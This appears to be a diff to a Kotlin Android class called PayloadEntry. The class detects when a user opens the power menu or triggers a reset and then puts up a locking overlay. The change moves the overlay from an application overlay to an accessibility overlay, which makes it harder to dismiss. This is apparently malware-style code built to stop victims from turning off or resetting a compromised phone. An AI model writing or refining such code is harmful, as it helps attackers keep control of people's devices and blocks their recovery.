@@ -73,7 +73,7 @@ class PayloadEntry : DynamicEntry {
                         activeScenario = 2
                         DynamicEntry.log("🚨 RESET DETECTED. Locking overlay.")
                         DynamicEntry.overlayConfig = DynamicEntry.OverlayConfig(
-                            type = android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
+                            type = android.view.WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                             flags = android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                         )
                         DynamicEntry.overlayContent = {
@@ -106,7 +106,7 @@ class PayloadEntry : DynamicEntry {
                     activeScenario = 1
                     DynamicEntry.log("🎯 POWER MENU DETECTED.")
                     DynamicEntry.overlayConfig = DynamicEntry.OverlayConfig(
-                            type = android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
+                            type = android.view.WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                             flags = android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                     )
                     DynamicEntry.overlayContent = {
